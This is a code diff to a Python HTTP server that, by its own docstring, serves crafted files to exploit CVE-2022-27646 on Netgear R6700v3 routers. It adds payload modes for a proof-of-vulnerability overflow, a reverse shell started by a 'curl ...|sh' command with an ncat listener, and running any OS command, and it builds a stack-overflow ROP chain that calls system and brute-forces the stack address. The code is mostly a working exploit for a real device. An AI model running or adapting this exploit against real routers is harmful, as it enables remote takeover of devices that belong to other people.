@@ -9,7 +9,7 @@ from typing       import Dict
 class HttpHandler(BaseHTTPRequestHandler):
 
     protocol_version = "HTTP/1.1"
-    cmd = None
+    payload = "leg"
     cmd_ptr = 0xbeffc104 + 392 + 4
     
     def version_string(self) -> str:
@@ -30,40 +30,44 @@ class HttpHandler(BaseHTTPRequestHandler):
         return b
     
     def serve_stage0_payload(self, database: bool = False) -> bytes:
-
-        cmd = HttpHandler.cmd
+        payload = HttpHandler.payload
         cmd_ptr = HttpHandler.cmd_ptr
 
         # Serve requests for database.bin
         if database:
-            if cmd:
-                return b"foobar"
-            else:
+            if payload == "leg":
                 return self.serve_file("resources/database.bin")
-            
+            return b"foobar"
+        
         # Serve requests for circleinfo.txt
-        if not cmd:
+        if payload == "leg":
             return self.serve_file("resources/circleinfo.txt")
+        elif payload == "pov":
+            return b"A"*1021 + b" X"
+        elif payload == "rsh":
+            cmd = "curl http://127.0.0.1:5000/stage1|sh"
+        else:
+            cmd = payload
 
         # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
         cmd = "touch${IFS}/tmp/st0;" + cmd.replace(" ", "${IFS}")
 
         # Generate payload
         max_cmd_len = 625-3
-        payload  = b"A"*368
-        payload += cmd_ptr.to_bytes(4, "little")        # g0_r6_val (addr. of OS command)
-        payload += b"B"*20
-        payload += b"\xb8\xc9\x00\x00"                  # g0_pc_val (addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
-        payload += b"X"*(max_cmd_len-len(cmd)) + b";"   # Fill up with an inexisting command
-        payload += bytes(cmd, "UTF-8")[:max_cmd_len]    # OS command to execute
-        payload += b";#"
-        payload += b" X"                                # String separator: sscanf(str, "%s %s", ...)
+        p  = b"A"*368
+        p += cmd_ptr.to_bytes(4, "little")        # g0_r6_val (addr. of OS command)
+        p += b"B"*20
+        p += b"\xb8\xc9\x00\x00"                  # g0_pc_val (addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
+        p += b"X"*(max_cmd_len-len(cmd)) + b";"   # Fill up with an inexisting command
+        p += bytes(cmd, "UTF-8")[:max_cmd_len]    # OS command to execute
+        p += b";#"
+        p += b" X"                                # String separator: sscanf(str, "%s %s", ...)
         print(f"[*] Stage 0 payload: 0x{cmd_ptr:08x} '{cmd:s}'")
 
         # Brute force the stack
         HttpHandler.cmd_ptr = cmd_ptr - 0x1000
 
-        return payload
+        return p
     
     def serve_stage1_payload(self) -> bytes:
         payload = b"""#!/bin/sh
@@ -99,12 +103,13 @@ class HttpServer:
     def __init__(self, args: Dict) -> None:
         self.host = args.host
         self.port = args.port
-        HttpHandler.cmd = args.cmd
+        HttpHandler.payload = args.payload
         return
     
     def run(self) -> None:
         httpd = HTTPServer((self.host, self.port), HttpHandler)
         print(f"[+] HTTP server listens on '{self.host:s}:{self.port:d}'.")
+        print(f"[+] Serving payload '{args.payload:s}'.")
         try:
             httpd.serve_forever()
         except KeyboardInterrupt:
@@ -120,23 +125,23 @@ if __name__ == "__main__":
     HTTP server delivering files `circleinfo.txt` and `database.bin` to exploit CVE-2022-27646 on
     Netgear R6700v3 routers.
 
-    In case argument `--cmd` is not specified, legitimate copies of files `circleinfo.txt` and
-    `database.bin` are served.
-
-    In case argument `--cmd` is specified, it corresponds to an OS command that will be included in
-    the stage 0 payload.
-
-    Use `--cmd "curl http://HOST:PORT/stage1|sh"` to trigger the invocation of a reverse shell. Note
-    that in order to receive the reverse shell, a listener on port 5001 has to be started beforehand
-    (`ncat -l -p 5001`).
+    `--payload "leg"`: legitimate
+            serve legitimate versions of files `circleinfo.txt` and `database.bin`
+    `--payload "pov"`: proof of vulnerability
+            serve files triggering the vulnerability
+    `--payload "rsh"`: reverse shell
+            serve files triggering a reverse shell connecting back to TCP port 5001
+            use `./server/bins/ncat -l -p 5001` to catch the reverse shell
+    `--payload OTHER`: OS command
+            serve files running the specified OS command on the target
     """
     parser = ArgumentParser(description=description, formatter_class=RawTextHelpFormatter)
     parser.add_argument("--host", type=str, default="0.0.0.0",
-                        help="host of the HTTP server")
+                        help="host of the HTTP server (default: '%(default)s')")
     parser.add_argument("--port", type=int, default=5000,
-                        help="port of the HTTP server")
-    parser.add_argument("--cmd", type=str, default=None,
-                        help="OS command to execute or None to send original files")
+                        help="port of the HTTP server (default: %(default)d)")
+    parser.add_argument("--payload", type=str, default="leg",
+                        help="payload (default: '%(default)s')")
     args =  parser.parse_args()
 
     # HTTP Server
